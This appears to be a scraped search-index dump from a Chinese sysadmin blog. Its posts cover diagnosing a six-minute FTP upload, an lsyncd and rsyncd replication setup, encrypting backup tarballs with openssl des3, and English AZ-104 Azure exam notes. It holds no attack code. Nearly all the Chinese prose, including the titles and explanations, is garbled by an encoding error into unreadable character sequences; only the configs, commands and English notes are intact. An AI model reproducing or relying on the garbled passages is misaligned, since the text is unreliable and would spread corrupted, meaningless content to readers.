1ã€ç™»å½•åˆ°30.18ä¸Šé¢æŸ¥çœ‹vsftpdæ—¥å¿—ä¿¡æ¯ï¼Œè¿‡æ»¤display.jpgçš„ä¿¡æ¯ï¼Œå‘ç°ä¸Šä¼ ä¿¡æ¯æ˜¯æ­£å¸¸çš„ã€‚\n2ã€æŸ¥çœ‹prometheusç›‘æ§å„é¡¹æŒ‡æ ‡éƒ½å¾ˆæ­£å¸¸ã€‚å”¯æœ‰é‚£ä¸ªç‚¹çš„ioæ¯”å¹³æ—¶é«˜ä¸€ç‚¹ï¼Œä»€ä¹ˆåŸå› å¯¼è‡´æœªçŸ¥.\n3ã€æŸ¥çœ‹vsftpdçš„å…¨éƒ¨æ—¥å¿—ä¿¡æ¯ï¼Œå‘ç°ftpæ¯åˆ°ä¸€ä¸ªç›®å½•å°±æ‰§è¡Œä¸€ä¸ªlistæ“ä½œï¼Œç”±äºproductç›®å½•ä¸‹é¢æ–‡ä»¶å¾ˆå¤šï¼Œæ‰€ä»¥è¿‡äº†6åˆ†é’Ÿæ‰ç›¸åº”ç»“æœï¼Œè¿™å°±æ˜¯å¯¼è‡´ftpæ…¢çš„åŸå› ã€‚ [å›¾ç‰‡] 4ã€æ‰¾ç ”å‘éƒ¨é—¨éªŒè¯ï¼Œç»ˆäºå‘ç°ftpå…¬å…±ç»„ä»¶ï¼Œä»£ç é‡Œç¡®å®æœ‰è¿™ä¸ªlistæ“ä½œã€‚ æ€»ç»“ï¼šå¼€å‘ç—…å¾—ä¸æ¸…ï¼Œåˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨å±…ç„¶æ¯æ¬¡éƒ½åˆ·ä¸€ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå¤ªå¼±æ™ºäº†ã€‚\n","permalink":"https://rendoumi.com/posts/20231208-ftp_slowly/","summary":"\u003ch2 id=\"é—®é¢˜è¯´æ˜\"\u003eé—®é¢˜è¯´æ˜ï¼š\u003c/h2\u003e\n\u003cp\u003e1ã€ç ”å‘åŒäº‹åé¦ˆåº”ç”¨ç¨‹åºä¸Šä¼ ä¸€å¼ å›¾ç‰‡è€—æ—¶6åˆ†é’Ÿï¼Œè®©æˆ‘ä»¬æ’æŸ¥ä¸€ä¸‹æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Ÿ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eINFO\u003cspan class=\"o\"\u003e]\u003c/span\u003e 2022-03-01 17:16:38.295 \u003cspan class=\"o\"\u003e[\u003c/span\u003evu73wwv64ba4ncfzaiiou2qsem\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eDubboServerHandler-172.18.32.254:20881-thread-2400\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eFtpFile.java:854:uploadFileToPath\u003cspan class=\"o\"\u003e()]\u003c/span\u003e uploadFileToPath path://c/product/590389/display/,fileName:display.jpg, cost:383667 ms\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ˜¾ç¤ºä¸Šä¼ ä¸€å¼ å›¾ç‰‡èŠ±äº†383667msï¼Œæ²¡é“ç†å•Šï¼Œè¿™äº‹è‡ªå»ºçš„vsftpæœåŠ¡å™¨ï¼Œä¹Ÿæ²¡å¾€ossæ¡¶é‡Œæ”¾ä¸œè¥¿çš„ã€‚\u003c/p\u003e\n\u003ch2 id=\"é—®é¢˜æ’æŸ¥\"\u003eé—®é¢˜æ’æŸ¥ï¼š\u003c/h2\u003e\n\u003cp\u003e1ã€ç™»å½•åˆ°30.18ä¸Šé¢æŸ¥çœ‹vsftpdæ—¥å¿—ä¿¡æ¯ï¼Œè¿‡æ»¤display.jpgçš„ä¿¡æ¯ï¼Œå‘ç°ä¸Šä¼ ä¿¡æ¯æ˜¯æ­£å¸¸çš„ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_144142.png\"\u003e\u003c/p\u003e\n\u003cp\u003e2ã€æŸ¥çœ‹prometheusç›‘æ§å„é¡¹æŒ‡æ ‡éƒ½å¾ˆæ­£å¸¸ã€‚å”¯æœ‰é‚£ä¸ªç‚¹çš„ioæ¯”å¹³æ—¶é«˜ä¸€ç‚¹ï¼Œä»€ä¹ˆåŸå› å¯¼è‡´æœªçŸ¥.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_144626.png\"\u003e\u003c/p\u003e\n\u003cp\u003e3ã€æŸ¥çœ‹vsftpdçš„å…¨éƒ¨æ—¥å¿—ä¿¡æ¯ï¼Œå‘ç°ftpæ¯åˆ°ä¸€ä¸ªç›®å½•å°±æ‰§è¡Œä¸€ä¸ªlistæ“ä½œï¼Œç”±äºproductç›®å½•ä¸‹é¢æ–‡ä»¶å¾ˆå¤šï¼Œæ‰€ä»¥è¿‡äº†6åˆ†é’Ÿæ‰ç›¸åº”ç»“æœï¼Œè¿™å°±æ˜¯å¯¼è‡´ftpæ…¢çš„åŸå› ã€‚\n[å›¾ç‰‡]\n\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_144753.png\"\u003e\u003c/p\u003e\n\u003cp\u003e4ã€æ‰¾ç ”å‘éƒ¨é—¨éªŒè¯ï¼Œç»ˆäºå‘ç°ftpå…¬å…±ç»„ä»¶ï¼Œä»£ç é‡Œç¡®å®æœ‰è¿™ä¸ªlistæ“ä½œã€‚\n\u003cimg loading=\"lazy\" src=\"/posts/20231208-ftp_slowly/2022-03-03_145030-17020249754001.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ€»ç»“ï¼šå¼€å‘ç—…å¾—ä¸æ¸…ï¼Œåˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨å±…ç„¶æ¯æ¬¡éƒ½åˆ·ä¸€ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå¤ªå¼±æ™ºäº†ã€‚\u003c/p\u003e","title":"å¼€å‘æŠ•è¯‰FTPæ…¢é—®é¢˜çš„è§£å†³"},{"content":"å…¬å¸ä½¿ç”¨æ™ºé½¿çš„æœºå™¨å´©äº†ï¼Œè¦åšæ•°æ®è¿ç§»ã€‚\nç”±ä¸‰å°è€æœºå™¨è¿ç§»åˆ°ä¸‰å°æ–°kvmæœºå™¨\næˆ‘ä»¬éœ€è¦æŠŠå…¶ä¸­ä¸€å°34.38çš„çš„ä¸œè¥¿å®æ—¶åŒæ­¥ä¸¤ä»½ï¼Œä¸€ä»½åˆ°30.18çš„glusterfsï¼Œä¸€ä»½åˆ°34.41çš„/data\nåŒæ—¶ä¹Ÿè¦æ³¨æ„30.18çš„GFSä¸­å·²ç»æœ‰ä¸¤ä¸ªè™šæœºæ–‡ä»¶ï¼Œ32.6å’Œ34.38çš„qcow2\næ‰€ä»¥lsyncåŠ¡å¿…è¦å°å¿ƒï¼Œä¸èƒ½åˆ é™¤å·²æœ‰æ–‡ä»¶\nå®‰è£…å¾ˆç®€å•ï¼š\nyum install epel-release yum install lsyncd 172.18.34.38ä¸Šé¢çš„/etc/lsyncd.confå¦‚ä¸‹ï¼ŒåŒæ­¥åˆ°ä¸¤ä¸ªç›®çš„åœ°ï¼š æ³¨æ„ä¸‹é¢çš„å‚æ•°ï¼š\nmaxProcesses = 2 # æœ¬æœºç”¨äºrsyncçš„è¿›ç¨‹æ•°\ndelete = \u0026lsquo;running\u0026rsquo; # åªåˆ é™¤lsyncå¯åŠ¨ä¹‹ååˆ é™¤çš„æ–‡ä»¶ï¼Œç›®çš„æ–‡ä»¶å¤¹ä¸­åŸæœ‰çš„æ–‡ä»¶ä¿å­˜\nexclude = \u0026ldquo;upload\u0026rdquo; # ç¬¬äºŒä¸ªåŒæ­¥ä¸­æ’é™¤çš„ç›®å½•ï¼Œæ³¨æ„è¿™é‡Œæ˜¯åŒ¹é…å…¨è·¯å¾„ä¸­çš„éƒ¨åˆ†å­—ä¸²ï¼Œupload å¯ä»¥åŒ¹é…åˆ° /data/new/chatmsg/upload/allajl.jpgï¼Œå°±uploadç›®å½•ä¸‹æ–‡ä»¶å¤§ï¼Œæ‰€ä»¥æŠŠå®ƒæ’é™¤ã€‚**è¿™é‡Œçš„è§„åˆ™æ˜¯å’Œrsyncä¸­excludeçš„å†™æ³•ä¸åŒçš„ï¼ï¼ï¼**åªå–è·¯å¾„ä¸­çš„uploadå­—ä¸²å°±å¯ä»¥æ’é™¤ã€‚\n----\r-- User configuration file for lsyncd.\r--\r-- Simple example for default rsync, but executing moves through on the target.\r--\r-- For more examples, see /usr/share/doc/lsyncd*/examples/\r-- -- sync{default.rsyncssh, source=\u0026#34;/var/www/html\u0026#34;, host=\u0026#34;localhost\u0026#34;, targetdir=\u0026#34;/tmp/htmlcopy/\u0026#34;}\rsettings {\rlogfile = \u0026#34;/var/log/lsyncd/lsyncd.log\u0026#34;,\rstatusFile = \u0026#34;/var/log/lsyncd/lsyncd-status.log\u0026#34;,\rstatusInterval = 5,\rmaxProcesses = 2\r}\rsync {\rdefault.rsync,\rsource = \u0026#34;/data/new\u0026#34;,\rtarget = \u0026#34;172.18.30.18::new\u0026#34;,\rdelete = \u0026#39;running\u0026#39;,\rdelay = 5,\rrsync = {\rbinary = \u0026#34;/usr/bin/rsync\u0026#34;,\rarchive = true,\rcompress = false,\rverbose = true\r}\r}\rsync {\rdefault.rsync,\rsource = \u0026#34;/data\u0026#34;,\rtarget = \u0026#34;172.18.34.41::new\u0026#34;,\rdelete = \u0026#39;running\u0026#39;,\rexclude = \u0026#34;upload\u0026#34;,\rdelay = 5,\rrsync = {\rbinary = \u0026#34;/usr/bin/rsync\u0026#34;,\rarchive = true,\rcompress = false,\rverbose = true\r}\r} å¯¹ç«¯rsyncdçš„é…ç½®å¦‚ä¸‹ï¼š\n# cat /etc/rsyncd.conf # /etc/rsyncd: configuration file for rsync daemon mode\r# See rsyncd.conf man page for more options.\r# configuration example:\r# uid = nobody\r# gid = nobody\r# use chroot = yes\r# max connections = 4\r# pid file = /var/run/rsyncd.pid\r# exclude = lost+found/\r# transfer logging = yes\r# timeout = 900\r# ignore nonreadable = yes\r# dont compress = *.gz *.tgz *.zip *.z *.Z *.rpm *.deb *.bz2\r# [ftp]\r# path = /home/ftp\r# comment = ftp export area\ruid = root\rgid = root\ruse chroot = no\rmax connections = 200\rtimeout = 300\rpid file = /var/run/rsyncd.pid\rlock file = /var/run/rsync.lock\rlog file = /var/log/rsyncd.log\r[new]\rpath = /root\rignore errors\rread only = false\rlist = false\rhosts allow = 172.18.34.38\rhosts deny = 0.0.0.0/32 æ³¨æ„ï¼šå¦‚æœç›®å½•ä¸‹æ–‡ä»¶æ•°è¿‡å¤šï¼Œéœ€è¦åŠ å¤§å†…æ ¸watchesæŒ‡æ ‡\nfs.inotify.max_user_watches=524288 è¿™æ˜¯ä¸ªæç«¯å¼ºåŠ›çš„å·¥å…·ï¼Œå¢™è£‚æ¨èï¼ã€‚\n","permalink":"https://rendoumi.com/posts/20231208-lsync/","summary":"\u003cp\u003eå…¬å¸ä½¿ç”¨æ™ºé½¿çš„æœºå™¨å´©äº†ï¼Œè¦åšæ•°æ®è¿ç§»ã€‚\u003c/p\u003e\n\u003cp\u003eç”±ä¸‰å°è€æœºå™¨è¿ç§»åˆ°ä¸‰å°æ–°kvmæœºå™¨\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬éœ€è¦æŠŠå…¶ä¸­ä¸€å°34.38çš„çš„ä¸œè¥¿å®æ—¶åŒæ­¥ä¸¤ä»½ï¼Œä¸€ä»½åˆ°30.18çš„glusterfsï¼Œä¸€ä»½åˆ°34.41çš„/data\u003c/p\u003e\n\u003cp\u003eåŒæ—¶ä¹Ÿè¦æ³¨æ„30.18çš„GFSä¸­å·²ç»æœ‰ä¸¤ä¸ªè™šæœºæ–‡ä»¶ï¼Œ32.6å’Œ34.38çš„qcow2\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥lsyncåŠ¡å¿…è¦å°å¿ƒï¼Œä¸èƒ½åˆ é™¤å·²æœ‰æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003eå®‰è£…å¾ˆç®€å•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install lsyncd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e172.18.34.38ä¸Šé¢çš„/etc/lsyncd.confå¦‚ä¸‹ï¼ŒåŒæ­¥åˆ°ä¸¤ä¸ªç›®çš„åœ°ï¼š\næ³¨æ„ä¸‹é¢çš„å‚æ•°ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003emaxProcesses = 2 # æœ¬æœºç”¨äºrsyncçš„è¿›ç¨‹æ•°\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003edelete = \u0026lsquo;running\u0026rsquo; # åªåˆ é™¤lsyncå¯åŠ¨ä¹‹ååˆ é™¤çš„æ–‡ä»¶ï¼Œç›®çš„æ–‡ä»¶å¤¹ä¸­åŸæœ‰çš„æ–‡ä»¶ä¿å­˜\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eexclude = \u0026ldquo;upload\u0026rdquo; # ç¬¬äºŒä¸ªåŒæ­¥ä¸­æ’é™¤çš„ç›®å½•ï¼Œæ³¨æ„è¿™é‡Œæ˜¯åŒ¹é…å…¨è·¯å¾„ä¸­çš„éƒ¨åˆ†å­—ä¸²ï¼Œupload å¯ä»¥åŒ¹é…åˆ° /data/new/chatmsg/upload/allajl.jpgï¼Œå°±uploadç›®å½•ä¸‹æ–‡ä»¶å¤§ï¼Œæ‰€ä»¥æŠŠå®ƒæ’é™¤ã€‚**è¿™é‡Œçš„è§„åˆ™æ˜¯å’Œrsyncä¸­excludeçš„å†™æ³•ä¸åŒçš„ï¼ï¼ï¼**åªå–è·¯å¾„ä¸­çš„uploadå­—ä¸²å°±å¯ä»¥æ’é™¤ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e----\r\n-- User configuration file for lsyncd.\r\n--\r\n-- Simple example for default rsync, but executing moves through on the target.\r\n--\r\n-- For more examples, see /usr/share/doc/lsyncd*/examples/\r\n-- \r\n-- sync{default.rsyncssh, source=\u0026#34;/var/www/html\u0026#34;, host=\u0026#34;localhost\u0026#34;, targetdir=\u0026#34;/tmp/htmlcopy/\u0026#34;}\r\n\r\nsettings {\r\n    logfile = \u0026#34;/var/log/lsyncd/lsyncd.log\u0026#34;,\r\n    statusFile = \u0026#34;/var/log/lsyncd/lsyncd-status.log\u0026#34;,\r\n    statusInterval = 5,\r\n    maxProcesses = 2\r\n}\r\n\r\nsync {\r\n    default.rsync,\r\n    source = \u0026#34;/data/new\u0026#34;,\r\n    target = \u0026#34;172.18.30.18::new\u0026#34;,\r\n    delete = \u0026#39;running\u0026#39;,\r\n    delay = 5,\r\n    rsync     = {\r\n        binary = \u0026#34;/usr/bin/rsync\u0026#34;,\r\n        archive = true,\r\n        compress = false,\r\n        verbose   = true\r\n    }\r\n}\r\n\r\nsync {\r\n    default.rsync,\r\n    source = \u0026#34;/data\u0026#34;,\r\n    target = \u0026#34;172.18.34.41::new\u0026#34;,\r\n    delete = \u0026#39;running\u0026#39;,\r\n    exclude = \u0026#34;upload\u0026#34;,\r\n    delay = 5,\r\n    rsync     = {\r\n        binary = \u0026#34;/usr/bin/rsync\u0026#34;,\r\n        archive = true,\r\n        compress = false,\r\n        verbose   = true\r\n    }\r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå¯¹ç«¯rsyncdçš„é…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e","title":"Lsync åŒæ­¥è½¯ä»¶çš„è¿ç”¨"},{"content":"å®¡è®¡çš„éœ€æ±‚ï¼Œéœ€è¦å®šæœŸå¤‡ä»½æ–‡ä»¶ï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¿™äº›å‹ç¼©åŒ…éœ€è¦åŠ å¯†ä¿å­˜ï¼Œæ¢å¤çš„æ—¶å€™éœ€è¦å¯†ç æ‰èƒ½æ¢å¤ï¼š\næŠŠç›®å½• 20231224å‹ç¼©è¿›åŠ å¯†åŒ…ï¼š\ntar -zcvf - 20231224|openssl des3 -salt -k \u0026lt;password\u0026gt; | dd of=/backup/cdrom/20231224.tar.gz.des3 è§£å‹ï¼š\ndd if=/backup/cdrom/20231224.tar.gz.des3 |openssl des3 -d -k \u0026lt;password\u0026gt;|tar zxf - ","permalink":"https://rendoumi.com/posts/20231208-encrypt_tar/","summary":"\u003cp\u003eå®¡è®¡çš„éœ€æ±‚ï¼Œéœ€è¦å®šæœŸå¤‡ä»½æ–‡ä»¶ï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¿™äº›å‹ç¼©åŒ…éœ€è¦åŠ å¯†ä¿å­˜ï¼Œæ¢å¤çš„æ—¶å€™éœ€è¦å¯†ç æ‰èƒ½æ¢å¤ï¼š\u003c/p\u003e\n\u003cp\u003eæŠŠç›®å½• 20231224å‹ç¼©è¿›åŠ å¯†åŒ…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -zcvf - 20231224\u003cspan class=\"p\"\u003e|\u003c/span\u003eopenssl des3 -salt -k \u0026lt;password\u0026gt; \u003cspan class=\"p\"\u003e|\u003c/span\u003e dd \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/backup/cdrom/20231224.tar.gz.des3\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£å‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/backup/cdrom/20231224.tar.gz.des3 \u003cspan class=\"p\"\u003e|\u003c/span\u003eopenssl des3 -d -k \u0026lt;password\u0026gt;\u003cspan class=\"p\"\u003e|\u003c/span\u003etar zxf -\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"LinuxåŠ å¯†å‹ç¼©taråŒ…"},{"content":"åœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œè€ƒäº†AZ-104å’ŒAZ-305ï¼Œæäº†ä¸€å¼ ä¸“å®¶è¯ä¹¦ï¼Œä»Šå¹´çš„è€ƒè¯•åˆ°å¤´äº†ã€‚\næ˜å¹´ç”¨å…è´¹azureè€ƒè¯•æŠµæ‰£ç¨ï¼ŒçœŸæ˜¯ä¸€ä»¶å¥½äº‹ã€‚\n","permalink":"https://rendoumi.com/posts/20230921-azure_certificate/","summary":"\u003cp\u003eåœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œè€ƒäº†AZ-104å’ŒAZ-305ï¼Œæäº†ä¸€å¼ ä¸“å®¶è¯ä¹¦ï¼Œä»Šå¹´çš„è€ƒè¯•åˆ°å¤´äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ˜å¹´ç”¨å…è´¹azureè€ƒè¯•æŠµæ‰£ç¨ï¼ŒçœŸæ˜¯ä¸€ä»¶å¥½äº‹ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230921152431697\" loading=\"lazy\" src=\"/posts/20230921-azure_certificate/image-20230921152431697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230921152857868\" loading=\"lazy\" src=\"/posts/20230921-azure_certificate/image-20230921152857868.png\"\u003e\u003c/p\u003e","title":"ä»Šå¹´ä¸‹åŠå¹´çš„ä¸¤å¼ Azureè®¤è¯"},{"content":"åœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œä¸€å¼ æ˜¯115$ï¼Œæ€•æµªè´¹å•Šï¼Œå°±åˆ†åˆ«è€ƒäº†AZ-104å’ŒAZ-305ï¼ŒåŸºæœ¬ä¸Šä½ 104èƒ½è¿‡ï¼Œ305å°±æ²¡æœ‰é—®é¢˜ï¼Œaz-104æŒºå¤šçŸ¥è¯†ç‚¹çš„ï¼Œæœ€è®¨åŒçš„æ˜¯æ­¥éª¤é¢˜ï¼Œä¸çŸ¥é“æ­»è®°é‚£äº›æ­¥éª¤æœ‰ä½•æ„æ€ï¼ŒæŠŠ104çš„çŸ¥è¯†è¦ç‚¹åˆ†åˆ—å¦‚ä¸‹ï¼š\nResourceGroupçš„ Tagä¸ä¼šè¢«resourceç»§æ‰¿ï¼Œæ–°å»ºçš„policyåªé’ˆå¯¹æ–°æ·»åŠ å’Œæ›´æ–°çš„resourceç”Ÿæ•ˆï¼Œå¯¹æ²¡æœ‰ä¿®æ”¹çš„resourceä¸ç”Ÿæ•ˆï¼Œå¦å¤–éœ€è¦å…³æ³¨policyçš„definationæ˜¯åªé’ˆå¯¹resourceè¿˜æ˜¯åŒ…æ‹¬resource groups Adds the specified tag and value when any resource missing this tag is created or updated. Existing resources can be remediated by triggering a remediation task. If the tag exists with a different value it will not be changed. Does not modify tags on resource groups.\nResize Availability Setä¸‹çš„VMï¼Œ éœ€è¦åœæ­¢Availability Setä¸‹æ‰€æœ‰çš„VM If the VM you wish to resize is part of an availability set, then you must stop all VMs in the availability set before changing the size of any VM in the availability set.\nThe number of fault domains for managed availability sets varies by region - either two or three per region. Each virtual machine in your availability set is assigned an update domain and a fault domain by the underlying Azure platform. For a given availability set, five non-user-configurable update domains are assigned by default (Resource Manager deployments can then be increased to provide up to 20 update domains) to indicate groups of virtual machines and underlying physical hardware that can be rebooted at the same time.\nYou need to make sure that the password cannot be stored in plain text.You are preparing to create the necessary components to achieve your goal. Key vault + access policy\nThe Add-AzVhd cmdlet uploads on-premises virtual hard disks, in .vhd file format, to a blob storage account as fixed virtual hard disks.\nrecovery For physical servers - Storage Account - Azure Recovery Services Vault - Replication policy https://docs.microsoft.com/en-us/azure/site-recovery/physical-azure-disaster-recovery For Hyper-v server - Hyper-V site - Azure Recovery Services Vault - Replication policy https://docs.microsoft.com/en-nz/azure/site-recovery/hyper-v-prepare-on-premises-tutorial\nIf you make a change to the topology of your network and have Windows VPN clients, the VPN client package for Windows clients must be downloaded and installed again in order for the changes to be applied to the client\nTo configure an Azure internal load balancer as a listener for the availability group, you need to create a TCP health probe on port 1433, which is the default port for SQL Server.\nEach VM will have a minimum of 1 NIC, which can have one or more IPs associated to it(include public and privite ip)\nYou can only restore a VM to the original VM or a new Azure VM. Azure Backup is a cloud-based backup solution, and it doesn\u0026rsquo;t support restoring VMs to on-premise Windows devices.\nYou can set expiration policy only for Office 365 groups in Azure Active Directory (Azure AD).\nEach management group and subscription can only support one parent\nGroups can contain both registered and joined devices as members. Cloud device admin cannot add/join devices,user admin can add device/user/groups, Dynamic groups dont require manual intervention, it uses criteria to add or remove devices/users/groups only assigned groups you can add\nYou can\u0026rsquo;t delete a Recovery Services vault with any of the following dependencies: You can\u0026rsquo;t delete a vault that contains backup data. Once backup data is deleted, it will go into the soft deleted state. You can\u0026rsquo;t delete a vault that contains backup data in the soft deleted state.\nBefore you can delete a Recovery Service vault that contains protected virtual machines, you need to stop the backup of each backup item.\nIf you want to change the recovery service vault you need to disassociate the previous RSV and delete the backup data. To delete backup data, you need to stop the backup first.\nRecover Servies vault backup need resource in the same location with vault. to create a Vault to protect VMs, the Vault must be in the same Region as the VMs. VM,SQL,file share support be backuped by Recover Servies vault Blobs cannot be backup up to service vaults.\nAzure RBAC is the authorization system you use to manage access to Azure resources.\nAzure (RBAC) and Azure AD roles are independent. AD roles do not grant access to resources and Azure roles do not grant access to Azure AD.\nAzure AD Roles like Global Administrator dont provided access to resources. For that RBAC Roles need to be aplied to the users.\nAdvisor helps you optimize and reduce your overall Azure spend by identifying idle and underutilized resources. You can get cost recommendations from the Cost tab on the Advisor dashboard.\nYou can adjust the guest user settings, their access, who can invite them from \u0026ldquo;External collaboration settings\u0026rdquo;\nYou must use Windows Server Active Directory to update the identity, contact info, or job info for users whose source of authority is Windows Server Active. Usage location is an Azure property that can only be modified from Azure AD (for all users including Windows Server AD users synced via Azure AD Connect).\nYour account must have any one of the following Azure roles at the subscription scope to enable traffic analytics: owner, contributor, reader, or network contributor. https://docs.microsoft.com/en-us/azure/network-watcher/traffic-analytics#user-access-requirements\nboth Tags and Locks are available to Subscriptions, Resource Groups, and Resources.\nAdministrative units restrict permissions in a role to any portion of your organization that you define.\nOwner = Grants full access to manage all resources, including the ability to assign roles in Azure RBAC. Contributor = Grants full access to manage all resources, but does NOT allow you to assign roles in Azure RBAC. (you cannot add users or changes their rights) User Access Administrator = Lets you manage user access to Azure resources. Reader = View all resources, but does not allow you to make any changes. Security Admin = View and update permissions for Security Center. Same permissions as the Security Reader role and can also update the security policy and dismiss alerts and recommendations. Network Contributor = Lets you manage networks, but not access to them. (so you can add VNET, subnet, etc)\nBefore you enable Azure AD over SMB for Azure file shares, make sure you have completed the following prerequisites: \\1. Select or create an Azure AD tenant. \\2. To support authentication with Azure AD credentials, you must enable Azure AD Domain Services for your Azure AD tenant.\nyou can assign policy to Tenant Root Group,ManagementGroup1,Subscription1 and RG1 you can exclude policy from ManagementGroup1,Subscription1,RG11 and VM1\nBuilt-in AD roles can\u0026rsquo;t be cloned, but built-in subscription roles can be. Custom roles of either type can be cloned.\nGroup-based licensing currently does not support groups that contain other groups (nested groups). If you apply a license to a nested group, only the immediate first-level user members of the group have the licenses appliedï¼ˆlicenseä¸æ”¯æŒåµŒå¥—groupï¼‰\nNesting is currently not supported for groups that can be assigned to a role. ï¼ˆroleä¸æ”¯æŒgroupåµŒå¥—ï¼‰\nGeneral-purpose v2 (GPv2) accounts are storage accounts that support all of the latest features for blobs, files, queues, and tables. Blob storage accounts support all the same block blob features as GPv2, but are limited to supporting only block blobs. General-purpose v1 (GPv1) accounts provide access to all Azure Storage services, but may not have the latest features or the lowest per gigabyte pricing.\nYou may only tier your object storage data to hot, cool, or archive in Blob storage and General Purpose v2 (GPv2) accounts. General Purpose v1 (GPv1) accounts do not support tiering.\nGeo-redundant storage (GRS): Cross-regional replication to protect against region-wide unavailability. Locally-redundant storage (LRS): A simple, low-cost replication strategy. Data is replicated within a single storage scale unit. Read-access geo-redundant storage (RA-GRS): Cross-regional replication with read access to the replica. RA-GRS provides read-only access to the data in the secondary location, in addition to geo-replication across two regions, but is more expensive compared to GRS.\nA sync group contains one cloud endpoint, or Azure file share, and at least one server endpoint. Azure File Sync does not support more than one server endpoint from the same register server in the same Sync Group. Multiple server endpoints can exist on the same volume if their namespaces are not overlapping (for example, F:\\sync1 and F:\\sync2) and each endpoint is syncing to a unique sync group.\nServer Point synced quick, cloud point sync in 24 hours. cloud endpoint, and it is scanned by the detection job every 24 hours the on-premises servers the file is scanned and synced automatically after it\u0026rsquo;s being added.\nAzCopy is a command-line utility that you can use to copy blobs or files to or from a storage account.\nBoth Azure Active Directory (AD) and Shared Access Signature (SAS) token are supported for Blob storage. Only Shared Access Signature (SAS) token is supported for File storage.\nThe location and subscription where this Log Analytics workspace can be created is independent of the location and subscription where your vaults exist. vaultå’Œlog analytics workspaceä¸æŒ‰ç…§locationå’ŒsubscriptionåŒºåˆ† Storage Account must be in the same Region as the Recovery Services Vault.\nPremium file shares are hosted in a special purpose storage account kind, called a FileStorage account. The archive tier supports only LRS, GRS, and RA-GRS.\nServer Message Block (SMB) is used to connect to an Azure file share over the internet. The SMB protocol requires TCP port 445 to be open. Incorrect Answers: Port 80 is required for HTTP to a web server Port 443 is required for HTTPS to a web server Port 3389 is required for Remote desktop protocol (RDP) connections\nWhile a blob is in archive storage, the blob data is offline and can\u0026rsquo;t be read or modified. To read or download a blob in archive, you must first rehydrate it to an online tier.\nbackup VM1 and make sure backup data are stored across three availability zones in the primary region. Create Recovery Services Vault, Set Replication Policy to ZRS (because of the requirement for having in three separate zones) For VM1, create a backup policy\nAzure storage encryption supports RSA and RSA-HSM keys of sizes 2048, 3072 and 4096\nStorage account policy: Maximum number of Stored access policies is 5 Maximum number of Immutable blob storage is 2\nLifecycle management policies are supported for block blobs and append blobs in general-purpose v2, premium block blob, and Blob Storage accounts. Only storage accounts that are configured for LRS, GRS, or RA-GRS support moving blobs to the 